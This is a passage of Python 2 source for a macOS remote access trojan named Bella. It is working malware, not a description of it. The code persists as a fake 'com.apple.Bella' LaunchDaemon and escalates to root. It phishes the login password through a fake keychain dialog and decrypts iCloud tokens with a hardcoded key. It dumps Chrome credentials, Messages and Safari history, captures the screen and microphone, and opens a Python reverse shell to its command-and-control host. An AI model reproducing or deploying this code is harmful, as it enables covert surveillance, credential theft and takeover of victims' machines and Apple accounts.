		send_msg("%sError copying Bella binary:\n\t%s" % (red_minus, error), False)
		return
	else:
		send_msg("%sCopied Bella binary '%sBella' to '%sBella'.\n" % (blue_star, get_bella_path(), relativeBellaPath), False)
	
	"""Copy bella launch_agent_name from current one to new one in /Library/LaunchDaemons"""
	error = Popen("%s \"cp '/Users/%s/Library/LaunchAgents/%s.plist' '/Library/LaunchDaemons/%s.plist'\"" % (rootsPath, get_bella_user(), launch_agent_name, launch_agent_name), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if error != '': #cp bella db to /Library (root location)
		send_msg("%sError copying launchagent '/Users/%s/Library/LaunchAgents/%s.plist' to '/Library/LaunchDaemons/%s.plist'.\n" % (red_minus, get_bella_user(), launch_agent_name, launch_agent_name), False)
		return
	else:
		send_msg("%sCopied launchagent '/Users/%s/Library/LaunchAgents/%s.plist' to '/Library/LaunchDaemons/%s.plist'.\n" % (blue_star, get_bella_user(), launch_agent_name, launch_agent_name), False)

	"""Replace path to bella binary in the new launchDaemon"""
	error = Popen("%s \"sed -i \'\' -e 's@/Users/%s/Library/@/Library/@' /Library/LaunchDaemons/%s.plist\"" % (rootsPath, get_bella_user(), launch_agent_name), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if error != '':
		send_msg("%sError replacing LaunchDaemon in line:\n\t%s" % (red_minus, error), False)
		return
	else:
		send_msg("%sReplaced LaunchDaemon in line.\n" % blue_star, False)

	"""Load new LaunchDaemon and then 'delete' the server"""
	error = Popen("%s \"launchctl load -w /Library/LaunchDaemons/%s.plist\"" % (rootsPath, launch_agent_name), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if 'service already loaded' not in error and error != '':
		send_msg("%sError loading LaunchDaemon:\n\t%s" % (red_minus, error), False)
		return
	else:
		send_msg("%sLoaded LaunchDaemon.\n" % blue_star, False)

	send_msg("%sRemoving current server.\n" % yellow_star, False)
	removeServer()
	return

def removeServer():
	subprocess_cleanup()
	destroyer = "rm -rf %s" % get_bella_path()
	if os.getuid() == 0:
		destroyer += "; rm -f /Library/LaunchDaemons/%s.plist" % (launch_agent_name)
	else:
		destroyer += "; rm -f /Users/%s/Library/LaunchAgents/%s.plist" % (get_bella_user(), launch_agent_name)
	os.system(destroyer)
	send_msg("Server destroyed.\n", True)
	unloader = "launchctl remove %s" % launch_agent_name
	os.system(unloader)

def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
	if os.getuid() == 0:
		send_msg("%sWe are already root.\n" % yellow_star, True)
		return
	else:
		send_msg("%sWe are not root. Attempting to root.\n" % blue_star, False)

	sys_vers = str(platform.mac_ver()[0])
	if is_there_SUID_shell():
		migrateToRoot('/usr/local/roots')
		send_msg('', True)
		return
	
	if local_pw_read():
		send_msg("%sLocal PW present.\n" % greenPlus, False)
		### We have a local password, let us try to use it to get a root shell ###
		binarymake = make_SUID_root_binary(local_pw_read(), None)
		send_msg(binarymake[1], False)
		if binarymake[0]:
			#updateDB('local user password', 'rootedMethod')
			#send_msg('', True)
			migrateToRoot('/usr/local/roots')
			send_msg('', True)
			return
	else:
		send_msg("%sNo local user password found. This will give us system and can be phished.\n" % red_minus, False)

	if sys_vers.startswith("10.8") or sys_vers.startswith("10.9") or sys_vers.startswith("10.10") or sys_vers == ("10.11") or sys_vers == ("10.11.1") or sys_vers == ("10.11.2") or sys_vers == ("10.11.3"):
		binarymake = make_SUID_root_binary(None, '%sexecuter/root_shell.sh' % get_bella_path())
		if binarymake[0]:
			#updateDB('local privilege escalation', 'rootedMethod')
			send_msg(binarymake[1], False)
			migrateToRoot('/usr/local/roots')
			send_msg('', True)
			return
	send_msg("%sLocal privilege escalation not implemented for OSX %s\n" % (red_minus, sys_vers), True)
	return

def tokenFactory(authCode):
	#now that we have proper b64 encoded auth code, we will attempt to get all account tokens.
	try:
		req = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
		req.add_header('Authorization', 'Basic %s' % authCode)
		req.add_header('Content-Type', 'application/xml') #for account settings it appears we cannot use json. type must be specified.
		req.add_header('X-MMe-Client-Info', '<iPhone6,1> <iPhone OS;9.3.2;13F69> <com.apple.AppleAccount/1.0 (com.apple.Preferences/1.0)>') #necessary header to get tokens.
		resp = urllib2.urlopen(req)
		content = resp.read()
		tokens = []
		#staple it together & call it bad weather
		accountInfo = []
		accountInfo.append(plistlib.readPlistFromString(content)["appleAccountInfo"]["fullName"] + " | " + plistlib.readPlistFromString(content)["appleAccountInfo"]["appleId"] + " | " + plistlib.readPlistFromString(content)["appleAccountInfo"]["dsPrsID"])
		
		try:
			tokens.append(plistlib.readPlistFromString(content)["tokens"]["mmeAuthToken"])
		except:
			pass
		try:
			tokens.append(plistlib.readPlistFromString(content)["tokens"]["cloudKitToken"])
		except:
			pass
		try:
			tokens.append(plistlib.readPlistFromString(content)["tokens"]["mmeFMFAppToken"])
		except:
			pass
		try:
			tokens.append(plistlib.readPlistFromString(content)["tokens"]["mmeFMIPToken"])
		except:
			pass
		try:
			tokens.append(plistlib.readPlistFromString(content)["tokens"]["mmeFMFToken"])
		except:
			pass

		return (tokens, accountInfo)
	except Exception, e:
		return '%s' % e

def tokenForce():
	global bellaConnection
	token = tokenRead()
	if token != False:
		send_msg("%sFound already generated token!%s\n%s" % (blue_star, blue_star, token), True)
		return 1
	while True: #no token exists, begin blast
		### sooooo turns out that SIP disables dtrace related things from working ... so this is useless 10.11 and up. will 
		### switch out for chain breaker
		from Foundation import NSData, NSPropertyListSerialization
		### CTRLC listener
		bellaConnection.settimeout(0.0) 
		try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
			if recv_msg(bellaConnection) == 'sigint9kill':
				sys.stdout.flush()
				send_msg('terminated', True) #send back confirmation along with STDERR
				done = True
				bellaConnection.settimeout(None)
				return 1
		except socket.error as e: #no message, business as usual
			pass
		bellaConnection.settimeout(None)
		kchain = getKeychains()
		send_msg("%sUsing [%s] as keychain.\n" % (yellow_star, kchain), False)
		
		iCloudKey = check_output("launchctl asuser %s security find-generic-password -ws 'iCloud' '%s'" % (bella_UID, kchain))
		if not iCloudKey[0]:
			if 51 == iCloudKey[2]:
				send_msg("%sUser clicked deny.\n" % red_minus, False)
				continue
			elif 44 == iCloudKey[2]:
				send_msg("%sNo iCloud Key Found!\n" % red_minus, True)
				return 0
			else:
				send_msg("Strange error [%s]\n" % iCloudKey[1], True)
				return 0
		iCloudKey = iCloudKey[1].replace('\n', '')
		
		msg = base64.b64decode(iCloudKey)
		key = "t9s\"lx^awe.580Gj%'ld+0LG<#9xa?>vb)-fkwb92[}"
		hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()
		hexedKey = binascii.hexlify(hashed)
		IV = 16 * '0'
		mme_token_file = glob("/Users/%s/Library/Application Support/iCloud/Accounts/*" % get_bella_user()) #this doesnt need to be globber bc only current user's info can be decrypted
		for x in mme_token_file:
			try:
				int(x.split("/")[-1])
				mme_token_file = x
			except ValueError:
				continue
		send_msg("%sDecrypting token plist\n\t[%s]\n" % (blue_star, mme_token_file), False)
		decryptedBinary = subprocess.check_output("openssl enc -d -aes-128-cbc -iv '%s' -K %s < '%s'" % (IV, hexedKey, mme_token_file), shell=True)
		binToPlist = NSData.dataWithBytes_length_(decryptedBinary, len(decryptedBinary))
		token_plist = NSPropertyListSerialization.propertyListWithData_options_format_error_(binToPlist, 0, None, None)[0]
		tokz = "[%s | %s]\n" % (token_plist["appleAccountInfo"]["primaryEmail"], token_plist["appleAccountInfo"]["fullName"])
		tokz += "%s:%s\n" % (token_plist["appleAccountInfo"]["dsPrsID"], token_plist["tokens"]["mmeAuthToken"])
		logged = updateDB(encrypt(tokz), 'mme_token') #update the DB....
		send_msg(tokz, True)
		return 1

def tokenRead():
	token = readDB('mme_token')
	if not token:
		return token
	return decrypt(token)

def chromeSSRead():
	sskey = readDB('chromeSS')
	if not sskey:
		return sskey
	return decrypt(sskey)

def local_pw_read():
	pw = readDB('localPass')
	if not pw:
		return pw
	return decrypt(pw)

def applepwRead():
	pw = readDB('applePass')
	if not pw:
		return pw
	return decrypt(pw)

def screenShot():
	screen = os.system("screencapture -x /tmp/screen")
	try:
		with open("/tmp/screen", "r") as shot:
			contents = base64.b64encode(shot.read())
		os.remove("/tmp/screen")
		return "screenCapture%s" % contents
	except IOError:
		return "screenCapture%s" % "error"

def send_msg(msg, EOF):
	global bellaConnection
	msg = pickle.dumps((msg, EOF))
	finalMsg = struct.pack('>I', len(msg)) + msg #serialize into string. pack bytes so that recv function knows how many bytes to loop
	bellaConnection.sendall(finalMsg) #send serialized

def getWifi():
	ssid = subprocess.Popen("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	try:
		value = ssid.stdout.read().split('SSID: ')[-1].split('\n')[0] + ssid.stderr.read()
	except Exception as e:
		value = "AirPort: Off"
	return value

def user_pass_phish():
	global bellaConnection
	userTB = cur_GUI_user()
	wifiNetwork = getWifi()
	icon = readDB('lock_icon', True)	
	if not icon:
		send_msg('Error generating lock icon, using system default.\n')
		path = ':System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:Actions.icns'
	else:
		path = payload_generator(icon).replace("/", ":")
	send_msg("Attempting to phish current GUI User [%s]\n" % userTB, False)
	while True:
		### CTRLC listener
		bellaConnection.settimeout(0.0) 
		try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
			if recv_msg(bellaConnection) == 'sigint9kill':
				sys.stdout.flush()
				send_msg('terminated', True) #send back confirmation along with STDERR
				done = True
				bellaConnection.settimeout(None)
				return 1
		except socket.error as e: #no message, business as usual
			pass
		bellaConnection.settimeout(None)
		check = local_pw_read()
		if isinstance(check, str):
			send_msg("%sAccount password already found:\n%s\n" % (blue_star, check.replace("\n", "")), True)
			return 1
		#os.system("networksetup -setairportpower en0 off") We can't disable Wi-Fi actually, bc then we lose our connection
		script = "launchctl asuser %s osascript -e 'tell app \"Finder\" to activate' -e 'tell app \"Finder\" to display dialog \"Could not find password to the network \\\"%s\\\". To access the network password please enter your keychain [login] password.\" default answer \"\" buttons {\"Always Allow\", \"Deny\", \"Allow\"} with icon file \"%s\" with hidden answer giving up after 15'" % (bella_UID, wifiNetwork, path) #with title \"Network Connection\" giving up after 15'" % wifiNetwork
		out = subprocess.check_output(script, shell=True)
		password = out.split("text returned:")[-1].replace("\n", "").split(", gave up")[0]
		send_msg("%sUser has attempted to use password: [%s]\n" % (blue_star, password), False)
		if password == "":
			continue
		if verifyPassword(userTB, password):
			send_msg("%sVerified! Account password is: [%s]%s\n" % (greenPlus, password, endANSI), False)
			subprocess_cleanup()
			updateDB(encrypt("%s:%s" % (userTB, password)), 'localPass') #store encrypted pass in DB
			#os.system("networksetup -setairportpower en0 on") #enable Wi-Fi
			send_msg("%sUsing this password to root Bella.\n" % yellow_star, False)
			rooter()
			return 1
		else:
			send_msg("%sUser input: [%s] failed. Trying again.\n" % (red_minus, password), False)
	return 1 #this should never get here, while loop should continue indefinitely.

def verifyPassword(username, password):
	try:
		output = subprocess.check_output("dscl /Local/Default -authonly %s %s" % (username, password), shell=True)
		return True
	except:
		return False

def vnc_start(vnc_port):
	send_msg('%sOpening VNC Connection.\n' % blue_star, False)
	if readDB('vnc', True):
		payload_path = payload_generator(readDB('vnc', True))
	else:
		return "%sNo VNC payload was found"
	pipe = subprocess.Popen('%s -connectHost %s -connectPort %s -rfbnoauth -disableLog' % (payload_path, host, vnc_port), shell=True, stderr=subprocess.PIPE)
	subprocess_manager(pipe.pid, '/'.join(payload_path.split('/')[:-1]), 'VNC')
	send_msg('%sOpened VNC [%s].\n' % (blue_star, pipe.pid), False)
	send_msg('%sOpening Stream.\n' % blue_star, False)
	time.sleep(2)
	send_msg("%sStarted VNC stream over -> %s:%s\n" % (blue_star, host, vnc_port), True)
	return 0

def get_bella_path():
	return helper_location

def get_bella_user():
	return bella_user

def bella(*Emma):
	### We start with having bella only work for the user who initially runs it ###
	### For now, we will assume that the initial user to run Bella is NOT root ###
	### This assumption is made bc if we have a root shell, we likely have a user shell ###
	###set global whoami to current user, this will be stored as the original user in DB
	global bellaConnection

	if not os.path.isdir(get_bella_path()):
		os.makedirs(get_bella_path())
	creator = createDB() #createDB will reference the global whoami
	if not creator[0]:
		print "ERROR CREATING DATABASE %s" % creator[1]
		pass

	os.chdir("/Users/%s/" % get_bella_user())

	if readDB('lastLogin') == False: #if it hasnt been set
		updateDB('Never', 'lastLogin')

	if not isinstance(get_model(), str): #if no model, put it in
		output = check_output("sysctl hw.model")
		if output[0]:
			modelRaw = output[1].split(":")[1].replace("\n", "").replace(" ", "")
		output = check_output("/usr/libexec/PlistBuddy -c 'Print :\"%s\"' /System/Library/PrivateFrameworks/ServerInformation.framework/Versions/A/Resources/English.lproj/SIMachineAttributes.plist | grep marketingModel" % modelRaw)
		if not output[0]:
			model = 'Macintosh'
		else:
			model = output[1].split("=")[1][1:] #get everything after equal sign, and then remove first space.
		updateDB(model, 'model')

	while True:
		subprocess_cleanup()
		print "Starting Bella"

		#create encrypted socket.
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.settimeout(None)
		bellaConnection = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE)
		
		try:
			print 'Connecting'
			bellaConnection.connect((host,port))
			print 'Connected'
		except socket.error as e:
			if e[0] == 61:
				print 'Connection refused.'
				pass
			else:
				print 'No connection: %s' % e
				pass
			time.sleep(5)
			continue

		print 'Listener active, server connected'
		while True:
			try:
				remove_SUID_shell() #remove if it exists
				print '%sAwaiting%s Data' % (yellow, endANSI)
				data = recv_msg(bellaConnection)
				print '%sReceived%s Data' % (green, endANSI)
				if not data:
					print 'Control disconnected'
					break #start listening again.
				elif data.startswith('cd'):
					path = data[3:]
					try:
						if path.startswith("~"):
							os.chdir(os.path.expanduser(path))
						else:
							os.chdir(path)
						files = []
						for x in os.listdir(os.getcwd()):
							if not x.startswith('.'):
								files.append(x)
						stdout_val = '\n'.join(files)
						send_msg("cwdcwd%s\n%s" % (os.getcwd(), stdout_val), True)
					except OSError, e:
						if e[0] == 2:
							send_msg("%sNo such file or directory.\n" % red_minus, True)
						else:
							send_msg("%sError\n%s\n" % (red_minus, e), True)
				
				elif data == 'ls': #will be our default ls handler
					fileList = [] #this will be used for autocompletion.
					filePrint = []
					for x in os.listdir(os.getcwd()):
						if not x.startswith('.') and x != "Icon\r":
							fileList.append(x)
					for x in sorted(fileList):
						try:
							perm = oct(os.stat(x).st_mode)[-3:]
							timestamp = time.strftime("%h %e %H:%M", time.localtime(os.lstat(x).st_mtime))
							size = byte_convert(os.lstat(x).st_size)
							hardlinks = str(os.lstat(x).st_nlink)
							isDirectory = stat.S_ISDIR(os.lstat(x).st_mode)
							if isDirectory:
								dirString = "d"
							else:
								dirString = "-"
							isExecutable = False
							if '1' in perm or '3' in perm or '7' in perm:
								isExecutable = True
							owner = pwd.getpwuid(os.lstat(x).st_uid).pw_name
							group = grp.getgrgid(os.lstat(x).st_gid).gr_name
							permList = {"0": "---", "1": "--x", "2": "-w-", "3": "-wx", "4": "r--", "5": "r-x", "6": "rw-", "7": "rwx"}
							permString = "%s%s%s" % (permList["%s" % perm[0]], permList["%s" % perm[1]], permList["%s" % perm[2]] )
							if isDirectory:
								x = "%s%s%s/" % (light_blue, x, endANSI)
							elif isExecutable:
								x = "%s%s%s%s*" % (dark_green, bold, x, endANSI)
							else:
								pass                      
							fileData = [dirString + permString, hardlinks, owner, group, size, timestamp, x]
							filePrint.append(fileData)
						except:
							pass
					send_msg('lserlser' + pickle.dumps((fileList, filePrint)), True)

				elif data == 'quit' or data == 'exit':
					send_msg("Exit", True)
				elif data == "initializeSocket":
					send_msg(initialize_socket(), True)
				elif data.startswith("payload_response_SBJ29"):
					payloads_encoded = data.split(':::')[1]
					print 'Got payloads! %s' % payloads_encoded[:20]
					print 'Creating DB from these payloads'
					if inject_payloads(payloads_encoded):
						send_msg('Injected payloads into Bella.\n', False)
						print 'Injected'
					else:
						send_msg('Error injecting payloads', False)
						print 'Error injecting payloads'
					send_msg(initialize_socket(), True)
				elif data == "iCloud_token":
					tokenForce()
				elif data == "insomnia_load":
					send_msg(insomnia_load(), True)
				elif data == "insomnia_unload":
					send_msg(insomnia_unload(), True)
				elif data == "manual":
					send_msg(manual(), True)
				elif data == "screen_shot":
					send_msg(screenShot(), True)
				elif data == "chrome_safe_storage":
					chrome_safe_storage()
				elif data == "check_backups":
					send_msg(iTunes_backup_looker()[0], True)
				elif data == "keychain_download":
					send_msg(keychain_download(), True)
				elif data == "iCloud_phish":
					check = applepwRead()
					if isinstance(check, str):
						send_msg("%sAlready have an apple pass.\n%s\n" % (blue_star, check), True)
					else:
						send_msg("appleIDPhishHelp" + appleIDPhishHelp(), True)
				elif data.startswith("iCloudPhishFinal"):
					appleIDPhish(data[16:].split(":")[0], data[16:].split(":")[1])
				elif data == "user_pass_phish":
					user_pass_phish()
				elif data.startswith("disableKM"):
					send_msg(disable_keyboard_mouse(data[9:]), True)
				elif data.startswith("enableKM"):
					send_msg(enable_keyboard_mouse(data[8:]), True)
				elif data == "reboot_server":
					send_msg(os.kill(bellaPID, 9), True)
				elif data == "current_users":
					send_msg('\001\033[4mCurrently logged in users:\033[0m\002\n%s' % check_current_users(), True)
				elif data == "bella_info":
					bella_info()
				elif data == "get_root":
					rooter()
				elif data == 'mike_stream':
					time.sleep(3)
					reader = readDB('microphone', True)
					if not reader:
						send_msg('%sError reading Microphone payload from Bella DB.\n' % red_minus, True)
					else:
						path = payload_generator(reader)
						mike_helper(path)

				elif data == "chrome_dump":
					returnVal = ""
					checkChrome = chromeSSRead()
					if isinstance(checkChrome, str):
						safe_storage_key = checkChrome
						loginData = glob("/Users/%s/Library/Application Support/Google/Chrome/*/Login Data" % get_bella_user()) #dont want to do all
						for x in loginData:
							returnVal += chrome_dump(safe_storage_key, x)
						send_msg(returnVal, True)
					else:
						send_msg("%s%sNo Chrome Safe Storage Key found!\n" % (returnVal, red_minus), True)

				elif data == "iCloud_FMIP":
					(username, password, usingToken) = iCloud_auth_process(False)
					if password == False: #means we couldnt get any creds
						send_msg(username, True) #send reason why
					else:
						if usingToken:
							send_msg("%sCannot locate iOS devices with only a token. Run iCloudPhish if you would like to phish the user for their iCloud Password.\n" % red_minus, True)
						else:
							FMIP(username, password)

				elif data == "iCloud_read":
					key = "%sThere is no iCloud ID available.\n" % red_minus
					check = applepwRead()
					if isinstance(check, str):
						key = applepwRead() + "\n"
					send_msg(key, True)

				elif data == "lpw_read":
					key = "%sThere is no local account available.\n" % red_minus
					check = local_pw_read()
					if isinstance(check, str):
						key = "%s\n" % check
					send_msg(key, True)

				elif data.startswith("mitm_start"):
					interface = data.split(":::")[1]
					cert = data.split(":::")[2]
					mitm_start(interface, cert)

				elif data.startswith("mitm_kill"):
					interface = data.split(":::")[1]
					certsha1 = data.split(":::")[2]
					mitm_kill(interface, certsha1)

				elif data == 'chat_history':
					chatDb = globber("/Users/*/Library/Messages/chat.db") #just get first chat DB
					serial = []
					for x in chatDb:
						data = bz2.compress(protected_file_reader(x))
						serial.append((x.split("/")[2], data))
					serialized = pickle.dumps(serial)
					send_msg("C5EBDE1F" + serialized, True)
			   
				elif data == 'safari_history':
					historyDb = globber("/Users/*/Library/Safari/History.db")
					serial = []
					for history in historyDb:
						copypath = tempfile.mkdtemp()
						with open('%s/safari' % copypath, 'w') as content:
							content.write(protected_file_reader(history))
						database = sqlite3.connect('%s/safari' % copypath)
						sql = "SELECT datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as last_visited, hi.url, hv.title FROM history_visits hv, history_items hi WHERE hv.history_item = hi.id;"
						content = ""
						with database:
							try:
								for x in database.execute(sql):
									x = filter(None, x)
									content += ' | '.join(x).encode('ascii', 'ignore') + '\n'
							except:
								pass
						content = bz2.compress(content)
						serial.append((history.split("/")[2], content)) #append owner of history
						shutil.rmtree(copypath)
					serialized = pickle.dumps(serial)
					send_msg("6E87CF0B" + serialized, True)
				
				elif data.startswith('download'):
					fileName = data[8:]
					try:
						with open(fileName, 'rb') as content:
							file_content = content.read()
						send_msg("%sFound [%s]. Preparing for download.\n" % (yellow_star, fileName), False)
						send_msg("downloader%s" % pickle.dumps((file_content, fileName)), True) #pack tuple
					except IOError, e:
						send_msg("%s%s\n" % (red_minus, e), True)
					except OSError, e:
						send_msg("%s%s\n" % (red_minus, e), True)

				elif data.startswith('uploader'):
					(file_content, fileName) = pickle.loads(data[8:])
					try:
						send_msg("%sBeginning write of [%s].\n" % (yellow_star, fileName), False)
						with open(fileName, 'wb') as content:
							content.write(file_content)
						send_msg("%sSucessfully wrote [%s/%s]\n" % (blue_star, os.getcwd(), fileName), True)
					except IOError, e:
						send_msg("%s%s\n" % (red_minus, e), True)
					except OSError, e:
						send_msg("%s%s\n" % (red_minus, e), True)

				elif data == "iCloud_query":
					(error, errorMessage, dsid, token) = main_iCloud_helper()
					if error:
						send_msg(errorMessage, True)
					else:
						iCloud_storage_helper(dsid, token)

				elif data == "iCloud_FMF":
					(error, errorMessage, dsid, token) = main_iCloud_helper()
					if error:
						send_msg(errorMessage, True)
					else:
						cardData = get_card_data(dsid, token)
						send_msg(heard_it_from_a_friend_who(dsid, token, cardData), True)

				elif data == 'iCloud_contacts':
					(error, errorMessage, dsid, token) = main_iCloud_helper()
					if error:
						send_msg(errorMessage, True)
					else:
						cardData = get_card_data(dsid, token)
						for vcard in cardData:
							send_msg("\033[1m%s\033[0m\n" % vcard[0][0], False)
							for numbers in vcard[1]:
								send_msg("[\033[94m%s\033[0m]\n" % numbers, False)
							for emails in vcard[2]:
								send_msg("[\033[93m%s\033[0m]\n" % emails, False)
						localToken = tokenRead()
						if localToken != False:
							send_msg('\033[1mFound %s iCloud Contacts for %s!\033[0m\n' % (len(cardData), localToken.split("\n")[0]), True)
						else:
							send_msg('', True)

				elif data == '3C336E68854':
					time.sleep(2)
					cmd = 'python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\'/bin/bash\')" ' + host + ' 3818'
					x = subprocess.Popen(cmd, shell=True)
					print x.pid
					send_msg('', True)

				elif data.startswith('vnc_start'):
					vnc_port = data.split(':::')[1]
					time.sleep(3)
					vnc_start(vnc_port)

				elif data == 'removeserver_yes':
					removeServer()					

				elif data == 'shutdownserver_yes':
					send_msg("Server will shutdown in 3 seconds.\n", True)
					subprocess_cleanup()
					os.system("sleep 3; launchctl remove %s" % launch_agent_name)
					#we shouldnt have to kill iTunes, but if there is a problem with launchctl ..

				elif data == 'get_client_info':
					output = check_output('scutil --get LocalHostName | tr -d "\n"; printf -- "->"; whoami | tr -d "\n"')
					if not output[0]:
						send_msg('Error-MB-Pro -> Error', True)
						continue
					send_msg(output[1], True)

				else:
					try:
						blocking = False
						blockers = ['sudo', 'nano', 'ftp', 'emacs', 'telnet', 'caffeinate', 'ssh'] #the best i can do for now ...
						for x in blockers:
							if x in data:
								send_msg('%s[%s] is a blocking command. It will not run.\n' % (yellow_star, x), True)
								blocking = True
								break
						if not blocking:
							proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
							####### MAKE THIS A GLOBAL RUNNER FUNCTION THAT WILL BE USED IN LIEU OF ALL CHECK_OUTPUTS #######
							done = False
							while proc.poll() == None:
								bellaConnection.settimeout(0.0) #set socket to non-blocking (dont wait for data)
								try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
									if recv_msg(bellaConnection) == 'sigint9kill':
										sys.stdout.flush()
										proc.terminate()
										send_msg('terminated', True) #send back confirmation along with STDERR
										done = True
										bellaConnection.settimeout(None)
										break
								except socket.error as e: #no message, business as usual
									pass
								bellaConnection.settimeout(None)

								line = proc.stdout.readline()
								if line != "":
									send_msg(line, False)
								else:
									#at this point we are done with the loop, can get / send stderr
									send_msg(line + proc.communicate()[1], True)
									done = True
									break
							if not done:
								send_msg(proc.stdout.read() + proc.stderr.read(), True)

					except socket.error, e:
						if e[0] == 32:
							print "Listener disconnected, broken pipe."
							pass
					except Exception as e:
						print e
						send_msg(str(e), True)

			except socket.error, e:
				traceback.print_exc()
				subprocess_cleanup()
				print repr(e)
				if e[0] == 54:
					print "Listener disconnected, connection reset"
					pass
				break

			except Exception:
				#any error here will be unrelated to socket malfunction. 
				bella_error = traceback.format_exc()
				print bella_error
				send_msg('%sMalfunction:\n```\n%s%s%s\n```\n' % (red_minus, red, bella_error, endANSI), True) #send error to CC, then continue
				continue
		try:
			bellaConnection.close()
		except:
			pass

##### Below variables are global scopes that are accessed by most of the methods in Bella. Should make a class structure #####
endANSI = '\001\033[0m\002'
bold = '\001\033[1m\002'
underline = '\001\033[4m\022'
red_minus = '\001\033[31m\002[-] %s' % endANSI
greenPlus = '\001\033[92m\002[+] %s' % endANSI
blue_star = '\001\033[94m\002[*] %s' % endANSI
yellow_star = '\001\033[93m\002[*] %s' % endANSI
violet = '\001\033[95m\002'
blue = '\001\033[94m\002'
light_blue = '\001\033[34m\002'
green = '\001\033[92m\002'
dark_green = '\001\033[32m\002'
yellow = '\001\033[93m\002'
red = '\001\033[31m\002'
bella_error = ''
cryptKey = 'edb0d31838fd883d3f5939d2ecb7e28c'
try:
	computer_name = subprocess.check_output('scutil --get LocalHostName', shell=True).replace('\n', '')
except:
	computer_name = platform.node()

if os.getuid() == 0:
	bella_user = cur_GUI_user()
	bella_UID = pwd.getpwnam(bella_user).pw_uid
else:
	bella_user = getpass.getuser()
	bella_UID = pwd.getpwnam(bella_user).pw_uid

bellaPID = os.getpid()

launch_agent_name = 'com.apple.Bella'
bella_folder = 'Containers/.bella'
if os.getuid() == 0:
	home_path = ''
else:
	home_path = os.path.expanduser('~')

if '/'.join(os.path.abspath(__file__).split('/')[:-1]).lower() != ('%s/Library/%s' % (home_path, bella_folder)).lower(): #then set up and load agents, etc
	print '[%s], [%s]' % ('/'.join(os.path.abspath(__file__).split('/')[:-1]).lower(), ('%s/Library/%s' % (home_path, bella_folder)).lower())
	print 'Bella is not in the proper folder. Resetting'
	create_bella_helpers(launch_agent_name, bella_folder, home_path)

helper_location = '/'.join(os.path.abspath(__file__).split('/')[:-1]) + '/'
payload_list = []
temp_file_list = []
host = '127.0.0.1' #Command and Control IP (listener will run on)
port = 4545 #What port Bella will operate over

#### End global variables ####
if __name__ == '__main__':
	bella()
